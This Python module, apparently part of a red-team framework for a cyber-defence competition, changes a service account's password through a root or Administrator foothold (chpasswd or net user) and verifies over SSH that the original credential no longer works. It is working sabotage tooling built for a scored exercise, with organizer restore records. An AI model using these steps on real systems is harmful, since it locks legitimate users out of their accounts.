"""rotate_credlist — change a credlist account's password, so the scoring engine's
own authenticated checks fail while the service stays up.

The credlist accounts (analyst / svc-backup / fieldtech …) are the accounts the
engine authenticates with. Rotating one is the hardest realistic hit in this
format: nothing is down, the credential is simply wrong, and only someone who can
restore the original password brings it back.

Ported from v1's `credlist_sabotage`, with four of its lessons load-bearing:

* **never rotate red's own way in.** The account this foothold is logged in as,
  the box account, root and every planted `svc-*` account are protected (v1's
  `is_protected`): rotating red's own way in is how a credlist hit turns into a
  self-lockout;
* **the original comes from intel ground truth first** — a world cred is only a
  fallback, and never one this effect wrote — or a second pass "restores" the
  first pass's random password (svc-matrix 2026-09-28);
* **a rotation is only real if the OLD credential stops working and the NEW one
  starts.** Both are probed over SSH before `ok=True`, because the ledger and
  the seed record are graded on that flag. If the old credential still
  authenticates (a pam_permit stack accepts ANY password — nakon plants it), the
  rotation achieved nothing and this reports `ok=False` with the box mutated, so
  the artifact/restore are still recorded but no impact is claimed;
* **the new password goes into state and the restore record, never into the
  notes.** world creds keep red able to work the account; `restore.secrets`
  renders only into the 0600 organizer artifact (report-secrets.md), while the
  blue-visible report gets the fact of the rotation and no value.
"""

import re
import secrets
import shlex
import string

from ..errors import PolicyError
from .base import Effect, Result, can_root, register
from .block_port import run_root_script
from .takedown import windows_admin

# The account names that must never be rotated: the box's own admin identities.
PROTECTED = ("root", "administrator", "admin")

_USER_RE = re.compile(r"^[A-Za-z0-9._-]+$")

# Same shape as v1's: long enough to be unguessable, plain alnum so it survives
# every shell, `chpasswd` and `net user` quoting path unchanged.
_PASSWORD_LEN = 14
_ALPHABET = string.ascii_letters + string.digits


def gen_password(rng=None):
    """A fresh password. `secrets` by default; pass an rng only for tests."""
    if rng is None:
        return "".join(secrets.choice(_ALPHABET) for _ in range(_PASSWORD_LEN))
    return "".join(rng.choice(_ALPHABET) for _ in range(_PASSWORD_LEN))


def protected(user, ctx, fh):
    """True for an account red must not rotate (its own access, or a plant).

    Credlist names and our planted `svc-*` accounts share a namespace, so the
    discriminator is the drawn-name set (`artifactnames.is_planted_account`) —
    `svc-backup` is a credlist account and must stay rotatable.
    """
    from . import artifactnames as names_mod
    user = (user or "").strip()
    if not user:
        return True
    if user.lower() in PROTECTED:
        return True
    if user.lower() == str((fh or {}).get("user", "")).lower():
        return True
    if user.lower() == str(ctx.intel.box_username() or "").lower():
        return True
    return names_mod.is_planted_account(user)


def eligible_users(ctx, ip, fh):
    """Credlist accounts on this box that are safe to rotate, in intel order."""
    out = []
    for user in (ctx.intel.credlist_users() or []):
        user = (user or "").strip()
        if not user or not _USER_RE.match(user) or user in out:
            continue
        if protected(user, ctx, fh):
            continue
        out.append(user)
    return out


def ground_truth(ctx, users):
    """{user: original password} from nakon's artifacts (never from world state)."""
    out = {}
    for cred in (ctx.intel.known_creds() or []):
        user, password = cred.get("user"), cred.get("password")
        if user in users and password is not None and user not in out:
            out[user] = password
    return out


@register
class RotateCredlist(Effect):
    id = "rotate_credlist"
    name = "rotate a credlist account password"
    description = (
        "Change one credlist account's password on a box where we have a root/admin "
        "path, so the engine's authenticated checks fail until someone restores the "
        "original — the service stays up, the credential is wrong. Picks an account "
        "that is not red's own (never the foothold user, the box account, root or a "
        "planted svc-* account), prefers one whose original password intel knows so "
        "the organizer's undo is exact, and proves the rotation by probing both "
        "credentials over SSH before claiming it. Rotated and original values are "
        "recorded for the organizer only.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "user": {"type": "str",
                 "desc": "credlist account to rotate (default: pick one from "
                         "intel.credlist_users() that is safe)"},
    }
    tags = frozenset({"pressure", "impacty"})
    needs = {"foothold": True, "root": False, "c2": False, "os": "any"}

    # -- preconditions ---------------------------------------------------------

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if fh.get("windows"):
            if not windows_admin(fh):
                raise PolicyError(f"rotate_credlist needs an Administrator "
                                  f"foothold on {ip}")
        elif not can_root(fh):
            raise PolicyError(f"rotate_credlist needs a root path on {ip} — "
                              "escalate first")
        if not (ctx.cfg.get("effects") or {}).get("rotate_credlist", True):
            raise PolicyError("rotate_credlist is switched off "
                              "(effects.rotate_credlist)")
        policy = getattr(ctx, "policy", None)
        if policy is not None and not policy.unrecoverable_unlocked():
            raise PolicyError("rotate_credlist is an unrecoverable move — locked "
                              "until the second half or the tier that unlocks it")
        user = (params.get("user") or "").strip()
        if user:
            if not _USER_RE.match(user):
                raise PolicyError(f"rotate_credlist: {user!r} is not a user name")
            if protected(user, ctx, fh):
                raise PolicyError(f"refusing to rotate {user!r} — that is red's own "
                                  "access or the box account")
        elif not eligible_users(ctx, ip, fh):
            raise PolicyError(f"no credlist account on {ip} is safe to rotate "
                              "(all of them are red's own or protected)")
        if ctx.world.failure_count(self.id, ip) >= 2:
            raise PolicyError(f"rotate_credlist already failed twice on {ip} — "
                              "inspect the box instead of re-running")

    # -- the body --------------------------------------------------------------

    def run(self, ctx, params):
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if fh is None:
            return Result(False, f"no foothold on {ip}")
        windows = bool(fh.get("windows"))
        if windows:
            if not windows_admin(fh):
                return Result(False, f"rotate_credlist needs an Administrator "
                                     f"foothold on {ip}")
        elif not can_root(fh):
            return Result(False, f"no root path on {ip} — privesc first")

        user, why = self._pick(ctx, ip, fh, params)
        if user is None:
            return Result(False, why)

        exists, why = self._exists(ctx, ip, fh, user, windows)
        if not exists:
            return Result(False, f"{user} does not exist on {ip} ({why})")

        users = eligible_users(ctx, ip, fh)
        old = ground_truth(ctx, [user]).get(user)
        if old is None:
            old = self._previous_original(ctx, ip, user)
        new = gen_password()
        ok, why = self._rotate(ctx, ip, fh, user, new, windows)
        if not ok:
            return Result(False, why)

        # The box changed: from here on the record must not depend on the claim
        # holding (installed=True), which is what `installed` is for.
        ctx.world.add_sabotage(ip, user, old or "", new)
        ctx.world.add_cred(user, new, self.id, ip)
        ctx.world.note(ip, f"credlist rotation: {user} password rotated — its "
                           "authenticated checks now fail")
        restore = self._restore(ip, user, old, new, windows)
        artifact = {"ip": ip, "kind": f"impact-{self.id}",
                    "detail": (f"credlist account {user} password rotated "
                               f"(original {'recorded' if old else 'unknown to red'})"),
                    # No check_cmd: reading the shadow hash needs root, and a
                    # check that fails for the wrong reason marks the artifact
                    # dead — which switches off every pressure candidate on the
                    # box (see policy._dead_artifacts). The restore table and
                    # world sabotage are the record.
                    "check_cmd": None, "paths": []}
        data = {"user": user, "old": bool(old), "users_on_box": users}

        new_ok = self._authenticates(ctx, ip, user, new, windows)
        old_dead = None if old is None else not self._authenticates(
            ctx, ip, user, old, windows)
        if not new_ok:
            return Result(False, f"rotated {user} on {ip} but the NEW credential "
                                 "does not authenticate — the rotation cannot be "
                                 "proven and blue's check may still pass",
                          data=data, restore=restore, artifacts=[artifact],
                          installed=True)
        if old_dead is False:
            return Result(False, f"rotation did not hold on {ip}: the ORIGINAL "
                                 f"credential for {user} still authenticates "
                                 "(any-password stack, or the change did not land)",
                          data=data, restore=restore, artifacts=[artifact],
                          installed=True)

        detail = (f"rotated the credlist password for {user} on {ip} — the original "
                  "credential no longer authenticates")
        if old is None:
            detail += (" (no original password in intel: the organizer restores "
                       "from its own inventory)")
        return Result(True, detail, data=data,
                      impact={"ip": ip, "service": user, "mode": self.id,
                              "detail": detail},
                      restore=restore, artifacts=[artifact], installed=True)

    # -- pieces ----------------------------------------------------------------

    def _pick(self, ctx, ip, fh, params):
        requested = (params.get("user") or "").strip()
        if requested:
            if not _USER_RE.match(requested):
                return None, f"invalid user name {requested!r}"
            if protected(requested, ctx, fh):
                return None, (f"refusing to rotate {requested!r} — red's own "
                              "access or the box account")
            return requested, ""
        users = eligible_users(ctx, ip, fh)
        if not users:
            return None, (f"no credlist account on {ip} is safe to rotate — all of "
                          "them are red's own or protected")
        known = ground_truth(ctx, users)
        # Prefer an account whose original password intel knows: the organizer's
        # undo is then exact instead of "restore it from your own inventory".
        return next((u for u in users if u in known), users[0]), ""

    @staticmethod
    def _previous_original(ctx, ip, user):
        """The last non-rotation password world saw for this account (v1's
        fallback). Excludes our own rotations, or a second pass would restore the
        first pass's random value."""
        for cred in ctx.world.valid_creds(ip):
            if cred.get("user") == user and cred.get("source") not in (
                    "rotate_credlist", "sabotage"):
                return cred.get("password") or None
        return None

    @staticmethod
    def _exists(ctx, ip, fh, user, windows):
        cmd = f"net user {user}" if windows else f"id {shlex.quote(user)}"
        try:
            if windows:
                rc, out, err = ctx.ssh.ssh_ps(ip, fh["user"],
                                              fh.get("password") or "", cmd,
                                              timeout=30, key_path=fh.get("key_path"))
            else:
                rc, out, err = run_root_script(ctx, ip, fh, cmd, timeout=30)
        except Exception as exc:
            return False, f"{type(exc).__name__}: {exc}"
        return rc == 0, (err or out or "").strip()[:120]

    @staticmethod
    def _rotate(ctx, ip, fh, user, new, windows):
        if windows:
            cmd = f"net user {user} {new}"
            try:
                rc, out, err = ctx.ssh.ssh_ps(ip, fh["user"],
                                              fh.get("password") or "", cmd,
                                              timeout=60, key_path=fh.get("key_path"))
            except Exception as exc:
                return False, f"rotation failed on {ip}: {type(exc).__name__}: {exc}"
            label = "net user"
        else:
            try:
                rc, out, err = run_root_script(
                    ctx, ip, fh, f"echo '{user}:{new}' | chpasswd", timeout=30)
            except Exception as exc:
                return False, f"rotation failed on {ip}: {type(exc).__name__}: {exc}"
            label = "chpasswd"
        if rc != 0:
            return False, (f"{label} rc={rc}: {(err or out or '').strip()[:200]}")
        return True, ""

    @staticmethod
    def _authenticates(ctx, ip, user, password, windows):
        """Probe one credential over SSH. Every failure mode is a plain "no":
        an auth rejection, a closed login path, a dead link. A zero exit means
        the session authenticated and the probe ran — the proof we can get."""
        probe = "whoami" if windows else "id"
        try:
            rc, _, _ = ctx.ssh.ssh(ip, user, password, probe, timeout=30,
                                   windows=windows)
        except Exception:
            return False
        return rc == 0

    @staticmethod
    def _restore(ip, user, old, new, windows):
        undo = (f"net user {user} <ORIGINAL-PASSWORD>" if windows
                else f"echo '{user}:<ORIGINAL-PASSWORD>' | chpasswd")
        return {
            "recipe": [
                f"# organizer-facing: {user} on {ip} is a credential change — both "
                "values are in report-secrets.md, never in this blue-visible table",
                undo,
            ],
            "secrets": (f"{user}@{ip}: rotated to {new}; original "
                        + (old or "(unknown to red — restore from the organizer's "
                                  "own inventory)")),
        }
